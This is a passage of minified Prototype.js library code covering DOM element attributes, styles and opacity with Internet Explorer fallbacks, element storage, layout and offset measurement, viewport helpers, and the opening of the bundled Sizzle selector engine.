element.title}}},ATTRIBUTE_TRANSLATIONS.write={names:{className:"class",htmlFor:"for",cellpadding:"cellPadding",cellspacing:"cellSpacing"},values:{checked:function(element,value){return value=!!value,element.checked=value,value?"checked":null},style:function(element,value){element.style.cssText=value||""}}},ATTRIBUTE_TRANSLATIONS.has={names:{}},Object.extend(ATTRIBUTE_TRANSLATIONS.write.names,ATTRIBUTE_TRANSLATIONS.read.names);for(var attr,CAMEL_CASED_ATTRIBUTE_NAMES=$w("colSpan rowSpan vAlign dateTime accessKey tabIndex encType maxLength readOnly longDesc frameBorder"),i=0;attr=CAMEL_CASED_ATTRIBUTE_NAMES[i];i++)ATTRIBUTE_TRANSLATIONS.write.names[attr.toLowerCase()]=attr,ATTRIBUTE_TRANSLATIONS.has.names[attr.toLowerCase()]=attr;function getStyle(element,style){element=$(element),style=function normalizeStyleName(style){return"float"===style||"styleFloat"===style?"cssFloat":style.camelize()}(style);var value=element.style[style];if(!value||"auto"===value){var css=document.defaultView.getComputedStyle(element,null);value=css?css[style]:null}return"opacity"===style?value?parseFloat(value):1:"auto"===value?null:value}function stripAlphaFromFilter_IE(filter){return(filter||"").replace(/alpha\([^\)]*\)/gi,"")}Object.extend(ATTRIBUTE_TRANSLATIONS.read.values,{href:_getAttr2,src:_getAttr2,type:function _getAttr(element,attribute){return element.getAttribute(attribute)},action:function _getAttrNode(element,attribute){var node=element.getAttributeNode(attribute);return node?node.value:""},disabled:_getFlag,checked:_getFlag,readonly:_getFlag,multiple:_getFlag,onload:_getEv,onunload:_getEv,onclick:_getEv,ondblclick:_getEv,onmousedown:_getEv,onmouseup:_getEv,onmouseover:_getEv,onmousemove:_getEv,onmouseout:_getEv,onfocus:_getEv,onblur:_getEv,onkeypress:_getEv,onkeydown:_getEv,onkeyup:_getEv,onsubmit:_getEv,onreset:_getEv,onselect:_getEv,onchange:_getEv}),Object.extend(methods,{identify:function identify(element){element=$(element);var id=Element.readAttribute(element,"id");if(id)return id;do{id="anonymous_element_"+idCounter++}while($(id));return Element.writeAttribute(element,"id",id),id},readAttribute:readAttribute,writeAttribute:function writeAttribute(element,name,value){element=$(element);var attributes={},table=ATTRIBUTE_TRANSLATIONS.write;for(var attr in"object"==typeof name?attributes=name:attributes[name]=!!Object.isUndefined(value)||value,attributes)name=table.names[attr]||attr,value=attributes[attr],table.values[attr]&&(value=table.values[attr](element,value),Object.isUndefined(value))||(!1===value||null===value?element.removeAttribute(name):!0===value?element.setAttribute(name,name):element.setAttribute(name,value));return element},classNames:function classNames(element){return new Element.ClassNames(element)},hasClassName:hasClassName,addClassName:function addClassName(element,className){if(element=$(element))return hasClassName(element,className)||(element.className+=(element.className?" ":"")+className),element},removeClassName:function removeClassName(element,className){if(element=$(element))return element.className=element.className.replace(getRegExpForClassName(className)," ").strip(),element},toggleClassName:function toggleClassName(element,className,bool){if(element=$(element))return Object.isUndefined(bool)&&(bool=!hasClassName(element,className)),(0,Element[bool?"addClassName":"removeClassName"])(element,className)}});var STANDARD_CSS_OPACITY_SUPPORTED=(DIV.style.cssText="opacity:.55",/^0.55/.test(DIV.style.opacity));function setOpacity(element,value){return 1==value||""===value?value="":value<1e-5&&(value=0),(element=$(element)).style.opacity=value,element}function getOpacity(element){return Element.getStyle(element,"opacity")}function getOpacity_IE(element){if(STANDARD_CSS_OPACITY_SUPPORTED)return getOpacity(element);var filter=Element.getStyle(element,"filter");if(0===filter.length)return 1;var match=(filter||"").match(/alpha\(opacity=(.*)\)/i);return match&&match[1]?parseFloat(match[1])/100:1}Object.extend(methods,{setStyle:function setStyle(element,styles){var elementStyle=(element=$(element)).style;if(Object.isString(styles)){if(elementStyle.cssText+=";"+styles,styles.include("opacity")){var opacity=styles.match(/opacity:\s*(\d?\.?\d*)/)[1];Element.setOpacity(element,opacity)}return element}for(var property in styles)if("opacity"===property)Element.setOpacity(element,styles[property]);else{var value=styles[property];"float"!==property&&"cssFloat"!==property||(property=Object.isUndefined(elementStyle.styleFloat)?"cssFloat":"styleFloat"),elementStyle[property]=value}return element},getStyle:getStyle,setOpacity:setOpacity,getOpacity:getOpacity}),"styleFloat"in DIV.style&&(methods.getStyle=function getStyle_IE(element,style){element=$(element),style=function normalizeStyleName_IE(style){return"float"===style||"cssFloat"===style?"styleFloat":style.camelize()}(style);var value=element.style[style];return!value&&element.currentStyle&&(value=element.currentStyle[style]),"opacity"===style?STANDARD_CSS_OPACITY_SUPPORTED?value?parseFloat(value):1:getOpacity_IE(element):"auto"===value?"width"!==style&&"height"!==style||!Element.visible(element)?null:Element.measure(element,style)+"px":value},methods.setOpacity=function setOpacity_IE(element,value){if(STANDARD_CSS_OPACITY_SUPPORTED)return setOpacity(element,value);element=function hasLayout_IE(element){return element.currentStyle&&element.currentStyle.hasLayout||(element.style.zoom=1),element}($(element));var filter=Element.getStyle(element,"filter"),style=element.style;return 1==value||""===value?((filter=stripAlphaFromFilter_IE(filter))?style.filter=filter:style.removeAttribute("filter"),element):(value<1e-5&&(value=0),style.filter=stripAlphaFromFilter_IE(filter)+" alpha(opacity="+100*value+")",element)},methods.getOpacity=getOpacity_IE);function getUniqueElementID(element){return element===window?0:(void 0===element._prototypeUID&&(element._prototypeUID=Element.Storage.UID++),element._prototypeUID)}GLOBAL.Element.Storage={UID:1};var HAS_UNIQUE_ID_PROPERTY="uniqueID"in DIV;function getStorage(element){if(element=$(element)){var uid=getUniqueElementID(element);return Element.Storage[uid]||(Element.Storage[uid]=$H()),Element.Storage[uid]}}HAS_UNIQUE_ID_PROPERTY&&(getUniqueElementID=function getUniqueElementID_IE(element){return element===window?0:element==document?1:element.uniqueID}),Object.extend(methods,{getStorage:getStorage,store:function store(element,key,value){if(element=$(element)){var storage=getStorage(element);return 2===arguments.length?storage.update(key):storage.set(key,value),element}},retrieve:function retrieve(element,key,defaultValue){if(element=$(element)){var storage=getStorage(element),value=storage.get(key);return Object.isUndefined(value)&&(storage.set(key,defaultValue),value=defaultValue),value}}});var Methods={},ByTag=Element.Methods.ByTag,F=Prototype.BrowserFeatures;!F.ElementExtensions&&"__proto__"in DIV&&(GLOBAL.HTMLElement={},GLOBAL.HTMLElement.prototype=DIV.__proto__,F.ElementExtensions=!0);var HTMLOBJECTELEMENT_PROTOTYPE_BUGGY=function checkElementPrototypeDeficiency(tagName){if(void 0===window.Element)return!1;if(!HAS_EXTENDED_CREATE_ELEMENT_SYNTAX)return!1;var proto=window.Element.prototype;if(proto){var id="_"+(Math.random()+"").slice(2),el=document.createElement(tagName);proto[id]="x";var isBuggy="x"!==el[id];return delete proto[id],el=null,isBuggy}return!1}("object");function extendElementWith(element,methods){for(var property in methods){var value=methods[property];Object.isFunction(value)&&!(property in element)&&(element[property]=value.methodize())}}var EXTENDED={};function elementIsExtended(element){return getUniqueElementID(element)in EXTENDED}function extend(element){if(!element||elementIsExtended(element))return element;if(element.nodeType!==Node.ELEMENT_NODE||element==window)return element;var methods=Object.clone(Methods),tagName=element.tagName.toUpperCase();return ByTag[tagName]&&Object.extend(methods,ByTag[tagName]),extendElementWith(element,methods),EXTENDED[getUniqueElementID(element)]=!0,element}function addMethodsToTagName(tagName,methods){tagName=tagName.toUpperCase(),ByTag[tagName]||(ByTag[tagName]={}),Object.extend(ByTag[tagName],methods)}function mergeMethods(destination,methods,onlyIfAbsent){for(var property in Object.isUndefined(onlyIfAbsent)&&(onlyIfAbsent=!1),methods){var value=methods[property];Object.isFunction(value)&&(onlyIfAbsent&&property in destination||(destination[property]=value.methodize()))}}function findDOMClass(tagName){var klass,trans={OPTGROUP:"OptGroup",TEXTAREA:"TextArea",P:"Paragraph",FIELDSET:"FieldSet",UL:"UList",OL:"OList",DL:"DList",DIR:"Directory",H1:"Heading",H2:"Heading",H3:"Heading",H4:"Heading",H5:"Heading",H6:"Heading",Q:"Quote",INS:"Mod",DEL:"Mod",A:"Anchor",IMG:"Image",CAPTION:"TableCaption",COL:"TableCol",COLGROUP:"TableCol",THEAD:"TableSection",TFOOT:"TableSection",TBODY:"TableSection",TR:"TableRow",TH:"TableCell",TD:"TableCell",FRAMESET:"FrameSet",IFRAME:"IFrame"};if(trans[tagName]&&(klass="HTML"+trans[tagName]+"Element"),window[klass])return window[klass];if(klass="HTML"+tagName+"Element",window[klass])return window[klass];if(klass="HTML"+tagName.capitalize()+"Element",window[klass])return window[klass];var element=document.createElement(tagName),proto=element.__proto__||element.constructor.prototype;return element=null,proto}F.SpecificElementExtensions&&(extend=HTMLOBJECTELEMENT_PROTOTYPE_BUGGY?function extend_IE8(element){if(!element||elementIsExtended(element))return element;var t=element.tagName;return t&&/^(?:object|applet|embed)$/i.test(t)&&(extendElementWith(element,Element.Methods),extendElementWith(element,Element.Methods.Simulated),extendElementWith(element,Element.Methods.ByTag[t.toUpperCase()])),element}:Prototype.K),Object.extend(GLOBAL.Element,{extend:extend,addMethods:function addMethods(methods){if(0===arguments.length&&function addFormMethods(){Object.extend(Form,Form.Methods),Object.extend(Form.Element,Form.Element.Methods),Object.extend(Element.Methods.ByTag,{FORM:Object.clone(Form.Methods),INPUT:Object.clone(Form.Element.Methods),SELECT:Object.clone(Form.Element.Methods),TEXTAREA:Object.clone(Form.Element.Methods),BUTTON:Object.clone(Form.Element.Methods)})}(),2===arguments.length){var tagName=methods;methods=arguments[1]}if(tagName)if(Object.isArray(tagName))for(var i=0;tag=tagName[i];i++)addMethodsToTagName(tag,methods);else addMethodsToTagName(tagName,methods);else Object.extend(Element.Methods,methods||{});var ELEMENT_PROTOTYPE=window.HTMLElement?HTMLElement.prototype:Element.prototype;if(F.ElementExtensions&&(mergeMethods(ELEMENT_PROTOTYPE,Element.Methods),mergeMethods(ELEMENT_PROTOTYPE,Element.Methods.Simulated,!0)),F.SpecificElementExtensions)for(var tag in Element.Methods.ByTag){var klass=findDOMClass(tag);Object.isUndefined(klass)||mergeMethods(klass.prototype,ByTag[tag])}Object.extend(Element,Element.Methods),Object.extend(Element,Element.Methods.Simulated),delete Element.ByTag,delete Element.Simulated,Element.extend.refresh(),ELEMENT_CACHE={}}}),extend===Prototype.K?GLOBAL.Element.extend.refresh=Prototype.emptyFunction:GLOBAL.Element.extend.refresh=function(){Prototype.BrowserFeatures.ElementExtensions||(Object.extend(Methods,Element.Methods),Object.extend(Methods,Element.Methods.Simulated),EXTENDED={})},Element.addMethods(methods),window.attachEvent&&window.attachEvent("onunload",(function destroyCache_IE(){DIV=null,ELEMENT_CACHE=null}))}(this),function(){function getRawStyle(element,style){var value=(element=$(element)).style[style];if(!value||"auto"===value){var css=document.defaultView.getComputedStyle(element,null);value=css?css[style]:null}return"opacity"===style?value?parseFloat(value):1:"auto"===value?null:value}function getContentWidth(element,context){return element.offsetWidth-(getPixelValue(element,"borderLeftWidth",context)||0)-(getPixelValue(element,"borderRightWidth",context)||0)-(getPixelValue(element,"paddingLeft",context)||0)-(getPixelValue(element,"paddingRight",context)||0)}function getPixelValue(value,property,context){var element=null;if(Object.isElement(value)&&(value=getRawStyle(element=value,property)),null===value||Object.isUndefined(value))return null;if(/^(?:-)?\d+(\.\d+)?(px)?$/i.test(value))return window.parseFloat(value);var isPercentage=value.include("%"),isViewport=context===document.viewport;if(/\d/.test(value)&&element&&element.runtimeStyle&&(!isPercentage||!isViewport)){var style=element.style.left,rStyle=element.runtimeStyle.left;return element.runtimeStyle.left=element.currentStyle.left,element.style.left=value||0,value=element.style.pixelLeft,element.style.left=style,element.runtimeStyle.left=rStyle,value}if(element&&isPercentage){context=context||element.parentNode;var decimal=function toDecimal(pctString){var match=pctString.match(/^(\d+)%?$/i);return match?Number(match[1])/100:null}(value),whole=null,isHorizontal=property.include("left")||property.include("right")||property.include("width"),isVertical=property.include("top")||property.include("bottom")||property.include("height");return context===document.viewport?isHorizontal?whole=document.viewport.getWidth():isVertical&&(whole=document.viewport.getHeight()):isHorizontal?whole=$(context).measure("width"):isVertical&&(whole=$(context).measure("height")),null===whole?0:whole*decimal}return 0}Object.isUndefined(document.documentElement.currentStyle)||Prototype.Browser.Opera||(getRawStyle=function getRawStyle_IE(element,style){var value=element.style[style];return!value&&element.currentStyle&&(value=element.currentStyle[style]),value});var hasLayout=Prototype.K;function getOffsetParent(element){function selfOrBody(element){return isHtml(element)?$(document.body):$(element)}if(isDocument(element=$(element))||isDetached(element)||isBody(element)||isHtml(element))return $(document.body);if(!("inline"===Element.getStyle(element,"display"))&&element.offsetParent)return selfOrBody(element.offsetParent);for(;(element=element.parentNode)&&element!==document.body;)if("static"!==Element.getStyle(element,"position"))return selfOrBody(element);return $(document.body)}function cumulativeOffset(element){var valueT=0,valueL=0;if((element=$(element)).parentNode)do{valueT+=element.offsetTop||0,valueL+=element.offsetLeft||0,element=element.offsetParent}while(element);return new Element.Offset(valueL,valueT)}function positionedOffset(element){var layout=(element=$(element)).getLayout(),valueT=0,valueL=0;do{if(valueT+=element.offsetTop||0,valueL+=element.offsetLeft||0,element=element.offsetParent){if(isBody(element))break;if("static"!==Element.getStyle(element,"position"))break}}while(element);return valueL-=layout.get("margin-left"),valueT-=layout.get("margin-top"),new Element.Offset(valueL,valueT)}function isBody(element){return"BODY"===element.nodeName.toUpperCase()}function isHtml(element){return"HTML"===element.nodeName.toUpperCase()}function isDocument(element){return element.nodeType===Node.DOCUMENT_NODE}function isDetached(element){return element!==document.body&&!Element.descendantOf(element,document.body)}"currentStyle"in document.documentElement&&(hasLayout=function(element){return element.currentStyle.hasLayout||(element.style.zoom=1),element}),Element.Layout=Class.create(Hash,{initialize:function($super,element,preCompute){$super(),this.element=$(element),Element.Layout.PROPERTIES.each((function(property){this._set(property,null)}),this),preCompute&&(this._preComputing=!0,this._begin(),Element.Layout.PROPERTIES.each(this._compute,this),this._end(),this._preComputing=!1)},_set:function(property,value){return Hash.prototype.set.call(this,property,value)},set:function(property,value){throw"Properties of Element.Layout are read-only."},get:function($super,property){var value=$super(property);return null===value?this._compute(property):value},_begin:function(){if(!this._isPrepared()){var element=this.element;if(function isDisplayed(element){for(;element&&element.parentNode;){if("none"===element.getStyle("display"))return!1;element=$(element.parentNode)}return!0}(element))this._setPrepared(!0);else{var originalStyles={position:element.style.position||"",width:element.style.width||"",visibility:element.style.visibility||"",display:element.style.display||""};element.store("prototype_original_styles",originalStyles);var position=getRawStyle(element,"position"),width=element.offsetWidth;0!==width&&null!==width||(element.style.display="block",width=element.offsetWidth);var context="fixed"===position?document.viewport:element.parentNode,tempStyles={visibility:"hidden",display:"block"};"fixed"!==position&&(tempStyles.position="absolute"),element.setStyle(tempStyles);var newWidth,positionedWidth=element.offsetWidth;if(width&&positionedWidth===width)newWidth=getContentWidth(element,context);else if("absolute"===position||"fixed"===position)newWidth=getContentWidth(element,context);else{var parent=element.parentNode;newWidth=$(parent).getLayout().get("width")-this.get("margin-left")-this.get("border-left")-this.get("padding-left")-this.get("padding-right")-this.get("border-right")-this.get("margin-right")}element.setStyle({width:newWidth+"px"}),this._setPrepared(!0)}}},_end:function(){var element=this.element,originalStyles=element.retrieve("prototype_original_styles");element.store("prototype_original_styles",null),element.setStyle(originalStyles),this._setPrepared(!1)},_compute:function(property){var COMPUTATIONS=Element.Layout.COMPUTATIONS;if(!(property in COMPUTATIONS))throw"Property not found.";return this._set(property,COMPUTATIONS[property].call(this,this.element))},_isPrepared:function(){return this.element.retrieve("prototype_element_layout_prepared",!1)},_setPrepared:function(bool){return this.element.store("prototype_element_layout_prepared",bool)},toObject:function(){var args=$A(arguments),keys=0===args.length?Element.Layout.PROPERTIES:args.join(" ").split(" "),obj={};return keys.each((function(key){if(Element.Layout.PROPERTIES.include(key)){var value=this.get(key);null!=value&&(obj[key]=value)}}),this),obj},toHash:function(){var obj=this.toObject.apply(this,arguments);return new Hash(obj)},toCSS:function(){var args=$A(arguments),keys=0===args.length?Element.Layout.PROPERTIES:args.join(" ").split(" "),css={};return keys.each((function(key){if(Element.Layout.PROPERTIES.include(key)&&!Element.Layout.COMPOSITE_PROPERTIES.include(key)){var value=this.get(key);null!=value&&(css[function cssNameFor(key){return key.include("border")&&(key+="-width"),key.camelize()}(key)]=value+"px")}}),this),css},inspect:function(){return"#<Element.Layout>"}}),Object.extend(Element.Layout,{PROPERTIES:$w("height width top left right bottom border-left border-right border-top border-bottom padding-left padding-right padding-top padding-bottom margin-top margin-bottom margin-left margin-right padding-box-width padding-box-height border-box-width border-box-height margin-box-width margin-box-height"),COMPOSITE_PROPERTIES:$w("padding-box-width padding-box-height margin-box-width margin-box-height border-box-width border-box-height"),COMPUTATIONS:{height:function(element){this._preComputing||this._begin();var bHeight=this.get("border-box-height");if(bHeight<=0)return this._preComputing||this._end(),0;var bTop=this.get("border-top"),bBottom=this.get("border-bottom"),pTop=this.get("padding-top"),pBottom=this.get("padding-bottom");return this._preComputing||this._end(),bHeight-bTop-bBottom-pTop-pBottom},width:function(element){this._preComputing||this._begin();var bWidth=this.get("border-box-width");if(bWidth<=0)return this._preComputing||this._end(),0;var bLeft=this.get("border-left"),bRight=this.get("border-right"),pLeft=this.get("padding-left"),pRight=this.get("padding-right");return this._preComputing||this._end(),bWidth-bLeft-bRight-pLeft-pRight},"padding-box-height":function(element){return this.get("height")+this.get("padding-top")+this.get("padding-bottom")},"padding-box-width":function(element){return this.get("width")+this.get("padding-left")+this.get("padding-right")},"border-box-height":function(element){this._preComputing||this._begin();var height=element.offsetHeight;return this._preComputing||this._end(),height},"border-box-width":function(element){this._preComputing||this._begin();var width=element.offsetWidth;return this._preComputing||this._end(),width},"margin-box-height":function(element){var bHeight=this.get("border-box-height"),mTop=this.get("margin-top"),mBottom=this.get("margin-bottom");return bHeight<=0?0:bHeight+mTop+mBottom},"margin-box-width":function(element){var bWidth=this.get("border-box-width"),mLeft=this.get("margin-left"),mRight=this.get("margin-right");return bWidth<=0?0:bWidth+mLeft+mRight},top:function(element){return element.positionedOffset().top},bottom:function(element){var offset=element.positionedOffset();return element.getOffsetParent().measure("height")-this.get("border-box-height")-offset.top},left:function(element){return element.positionedOffset().left},right:function(element){var offset=element.positionedOffset();return element.getOffsetParent().measure("width")-this.get("border-box-width")-offset.left},"padding-top":function(element){return getPixelValue(element,"paddingTop")},"padding-bottom":function(element){return getPixelValue(element,"paddingBottom")},"padding-left":function(element){return getPixelValue(element,"paddingLeft")},"padding-right":function(element){return getPixelValue(element,"paddingRight")},"border-top":function(element){return getPixelValue(element,"borderTopWidth")},"border-bottom":function(element){return getPixelValue(element,"borderBottomWidth")},"border-left":function(element){return getPixelValue(element,"borderLeftWidth")},"border-right":function(element){return getPixelValue(element,"borderRightWidth")},"margin-top":function(element){return getPixelValue(element,"marginTop")},"margin-bottom":function(element){return getPixelValue(element,"marginBottom")},"margin-left":function(element){return getPixelValue(element,"marginLeft")},"margin-right":function(element){return getPixelValue(element,"marginRight")}}}),"getBoundingClientRect"in document.documentElement&&Object.extend(Element.Layout.COMPUTATIONS,{right:function(element){var parent=hasLayout(element.getOffsetParent()),rect=element.getBoundingClientRect();return(parent.getBoundingClientRect().right-rect.right).round()},bottom:function(element){var parent=hasLayout(element.getOffsetParent()),rect=element.getBoundingClientRect();return(parent.getBoundingClientRect().bottom-rect.bottom).round()}}),Element.Offset=Class.create({initialize:function(left,top){this.left=left.round(),this.top=top.round(),this[0]=this.left,this[1]=this.top},relativeTo:function(offset){return new Element.Offset(this.left-offset.left,this.top-offset.top)},inspect:function(){return"#<Element.Offset left: #{left} top: #{top}>".interpolate(this)},toString:function(){return"[#{left}, #{top}]".interpolate(this)},toArray:function(){return[this.left,this.top]}}),Prototype.Browser.IE?(getOffsetParent=getOffsetParent.wrap((function(proceed,element){if(isDocument(element=$(element))||isDetached(element)||isBody(element)||isHtml(element))return $(document.body);var position=element.getStyle("position");if("static"!==position)return proceed(element);element.setStyle({position:"relative"});var value=proceed(element);return element.setStyle({position:position}),value})),positionedOffset=positionedOffset.wrap((function(proceed,element){if(!(element=$(element)).parentNode)return new Element.Offset(0,0);var position=element.getStyle("position");if("static"!==position)return proceed(element);var offsetParent=element.getOffsetParent();offsetParent&&"fixed"===offsetParent.getStyle("position")&&hasLayout(offsetParent),element.setStyle({position:"relative"});var value=proceed(element);return element.setStyle({position:position}),value}))):Prototype.Browser.Webkit&&(cumulativeOffset=function(element){element=$(element);var valueT=0,valueL=0;do{if(valueT+=element.offsetTop||0,valueL+=element.offsetLeft||0,element.offsetParent==document.body&&"absolute"==Element.getStyle(element,"position"))break;element=element.offsetParent}while(element);return new Element.Offset(valueL,valueT)}),Element.addMethods({getLayout:function getLayout(element,preCompute){return new Element.Layout(element,preCompute)},measure:function measure(element,property){return $(element).getLayout().get(property)},getWidth:function getWidth(element){return Element.getDimensions(element).width},getHeight:function getHeight(element){return Element.getDimensions(element).height},getDimensions:function getDimensions(element){element=$(element);var display=Element.getStyle(element,"display");if(display&&"none"!==display)return{width:element.offsetWidth,height:element.offsetHeight};var style=element.style,originalStyles={visibility:style.visibility,position:style.position,display:style.display},newStyles={visibility:"hidden",display:"block"};"fixed"!==originalStyles.position&&(newStyles.position="absolute"),Element.setStyle(element,newStyles);var dimensions={width:element.offsetWidth,height:element.offsetHeight};return Element.setStyle(element,originalStyles),dimensions},getOffsetParent:getOffsetParent,cumulativeOffset:cumulativeOffset,positionedOffset:positionedOffset,cumulativeScrollOffset:function cumulativeScrollOffset(element){var valueT=0,valueL=0;do{if(element===document.body){var bodyScrollNode=document.documentElement||document.body.parentNode||document.body;valueT+=Object.isUndefined(window.pageYOffset)?bodyScrollNode.scrollTop||0:window.pageYOffset,valueL+=Object.isUndefined(window.pageXOffset)?bodyScrollNode.scrollLeft||0:window.pageXOffset;break}valueT+=element.scrollTop||0,valueL+=element.scrollLeft||0,element=element.parentNode}while(element);return new Element.Offset(valueL,valueT)},viewportOffset:function viewportOffset(forElement){var valueT=0,valueL=0,docBody=document.body,element=forElement=$(forElement);do{if(valueT+=element.offsetTop||0,valueL+=element.offsetLeft||0,element.offsetParent==docBody&&"absolute"==Element.getStyle(element,"position"))break}while(element=element.offsetParent);element=forElement;do{element!=docBody&&(valueT-=element.scrollTop||0,valueL-=element.scrollLeft||0)}while(element=element.parentNode);return new Element.Offset(valueL,valueT)},absolutize:function absolutize(element){if(element=$(element),"absolute"===Element.getStyle(element,"position"))return element;var offsetParent=getOffsetParent(element),eOffset=element.viewportOffset(),pOffset=offsetParent.viewportOffset(),offset=eOffset.relativeTo(pOffset),layout=element.getLayout();return element.store("prototype_absolutize_original_styles",{position:element.getStyle("position"),left:element.getStyle("left"),top:element.getStyle("top"),width:element.getStyle("width"),height:element.getStyle("height")}),element.setStyle({position:"absolute",top:offset.top+"px",left:offset.left+"px",width:layout.get("width")+"px",height:layout.get("height")+"px"}),element},relativize:function relativize(element){if(element=$(element),"relative"===Element.getStyle(element,"position"))return element;var originalStyles=element.retrieve("prototype_absolutize_original_styles");return originalStyles&&element.setStyle(originalStyles),element},scrollTo:function scrollTo(element){element=$(element);var pos=Element.cumulativeOffset(element);return window.scrollTo(pos.left,pos.top),element},makePositioned:function makePositioned(element){element=$(element);var position=Element.getStyle(element,"position"),styles={};return"static"!==position&&position||(styles.position="relative",Prototype.Browser.Opera&&(styles.top=0,styles.left=0),Element.setStyle(element,styles),Element.store(element,"prototype_made_positioned",!0)),element},undoPositioned:function undoPositioned(element){element=$(element);var storage=Element.getStorage(element);return storage.get("prototype_made_positioned")&&(storage.unset("prototype_made_positioned"),Element.setStyle(element,{position:"",top:"",bottom:"",left:"",right:""})),element},makeClipping:function makeClipping(element){element=$(element);var storage=Element.getStorage(element),madeClipping=storage.get("prototype_made_clipping");if(Object.isUndefined(madeClipping)){var overflow=Element.getStyle(element,"overflow");storage.set("prototype_made_clipping",overflow),"hidden"!==overflow&&(element.style.overflow="hidden")}return element},undoClipping:function undoClipping(element){element=$(element);var storage=Element.getStorage(element),overflow=storage.get("prototype_made_clipping");return Object.isUndefined(overflow)||(storage.unset("prototype_made_clipping"),element.style.overflow=overflow||""),element},clonePosition:function clonePosition(element,source,options){options=Object.extend({setLeft:!0,setTop:!0,setWidth:!0,setHeight:!0,offsetTop:0,offsetLeft:0},options||{});var docEl=document.documentElement;source=$(source),element=$(element);var p,delta,layout,styles={};if((options.setLeft||options.setTop)&&(p=Element.viewportOffset(source),delta=[0,0],"absolute"===Element.getStyle(element,"position"))){var parent=Element.getOffsetParent(element);parent!==document.body&&(delta=Element.viewportOffset(parent))}var pageXY=function pageScrollXY(){var x=0,y=0;return Object.isNumber(window.pageXOffset)?(x=window.pageXOffset,y=window.pageYOffset):document.body&&(document.body.scrollLeft||document.body.scrollTop)?(x=document.body.scrollLeft,y=document.body.scrollTop):docEl&&(docEl.scrollLeft||docEl.scrollTop)&&(x=docEl.scrollLeft,y=docEl.scrollTop),{x:x,y:y}}();return(options.setWidth||options.setHeight)&&(layout=Element.getLayout(source)),options.setLeft&&(styles.left=p[0]+pageXY.x-delta[0]+options.offsetLeft+"px"),options.setTop&&(styles.top=p[1]+pageXY.y-delta[1]+options.offsetTop+"px"),element.getLayout(),options.setWidth&&(styles.width=layout.get("width")+"px"),options.setHeight&&(styles.height=layout.get("height")+"px"),Element.setStyle(element,styles)}}),"getBoundingClientRect"in document.documentElement&&Element.addMethods({viewportOffset:function(element){if(isDetached(element=$(element)))return new Element.Offset(0,0);var rect=element.getBoundingClientRect(),docEl=document.documentElement;return new Element.Offset(rect.left-docEl.clientLeft,rect.top-docEl.clientTop)}})}(),function(){var IS_OLD_OPERA=Prototype.Browser.Opera&&window.parseFloat(window.opera.version())<9.5,ROOT=null;function getRootElement(){return ROOT||(ROOT=IS_OLD_OPERA?document.body:document.documentElement)}document.viewport={getDimensions:function getDimensions(){return{width:this.getWidth(),height:this.getHeight()}},getWidth:function getWidth(){return getRootElement().clientWidth},getHeight:function getHeight(){return getRootElement().clientHeight},getScrollOffsets:function getScrollOffsets(){var x=window.pageXOffset||document.documentElement.scrollLeft||document.body.scrollLeft,y=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop;return new Element.Offset(x,y)}}}(),window.$$=function(){var expression=$A(arguments).join(", ");return Prototype.Selector.select(expression,document)},Prototype.Selector=function(){var K=Prototype.K;return{select:function select(){throw new Error('Method "Prototype.Selector.select" must be defined.')},match:function match(){throw new Error('Method "Prototype.Selector.match" must be defined.')},find:function find(elements,expression,index){index=index||0;var i,match=Prototype.Selector.match,length=elements.length,matchIndex=0;for(i=0;i<length;i++)if(match(elements[i],expression)&&index==matchIndex++)return Element.extend(elements[i])},extendElements:Element.extend===K?K:function extendElements(elements){for(var i=0,length=elements.length;i<length;i++)Element.extend(elements[i]);return elements},extendElement:Element.extend}}(),Prototype._original_property=window.Sizzle,function(){function fakeDefine(fn){Prototype._actual_sizzle=fn()}fakeDefine.amd=!0,"undefined"!=typeof define&&define.amd&&(Prototype._original_define=define,Prototype._actual_sizzle=null,window.define=fakeDefine)}(),function(window){var i,support,Expr,getText,isXML,compile,select,outermostContext,sortInput,hasDuplicate,setDocument,document,docElem,documentIsHTML,rbuggyQSA,rbuggyMatches,matches,contains,expando="sizzle"+-new Date,preferredDoc=window.document,dirruns=0,done=0,classCache=createCache(),tokenCache=createCache(),compilerCache=createCache(),sortOrder=function(a,b){return a===b&&(hasDuplicate=!0),0},strundefined="undefined",hasOwn={}.hasOwnProperty,arr=[],pop=arr.pop,push_native=arr.push,push=arr.push,slice=arr.slice,indexOf=arr.indexOf||function(elem){for(var i=0,len=this.length;i<len;i++)if(this[i]===elem)return i;return-1},booleans="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",whitespace="[\\x20\\t\\r\\n\\f]",characterEncoding="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",identifier=characterEncoding.replace("w","w#"),attributes="\\[[\\x20\\t\\r\\n\\f]*("+characterEncoding+")"+whitespace+"*(?:([*^$|!~]?=)"+whitespace+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+identifier+")|)|)"+whitespace+"*\\]",pseudos=":("+characterEncoding+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+attributes.replace(3,8)+")*)|.*)\\)|)",rtrim=new RegExp("^[\\x20\\t\\r\\n\\f]+|((?:^|[^\\\\])(?:\\\\.)*)[\\x20\\t\\r\\n\\f]+$","g"),rcomma=new RegExp("^[\\x20\\t\\r\\n\\f]*,[\\x20\\t\\r\\n\\f]*"),rcombinators=new RegExp("^[\\x20\\t\\r\\n\\f]*([>+~]|[\\x20\\t\\r\\n\\f])[\\x20\\t\\r\\n\\f]*"),rattributeQuotes=new RegExp("=[\\x20\\t\\r\\n\\f]*([^\\]'\"]*?)[\\x20\\t\\r\\n\\f]*\\]","g"),rpseudo=new RegExp(pseudos),ridentifier=new RegExp("^"+identifier+"$"),matchExpr={ID:new RegExp("^#("+characterEncoding+")"),CLASS:new RegExp("^\\.("+characterEncoding+")"),TAG:new RegExp("^("+characterEncoding.replace("w","w*")+")"),ATTR:new RegExp("^"+attributes),PSEUDO:new RegExp("^"+pseudos),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\([\\x20\\t\\r\\n\\f]*(even|odd|(([+-]|)(\\d*)n|)[\\x20\\t\\r\\n\\f]*(?:([+-]|)[\\x20\\t\\r\\n\\f]*(\\d+)|))[\\x20\\t\\r\\n\\f]*\\)|)","i"),bool:new RegExp("^(?:"+booleans+")$","i"),needsContext:new 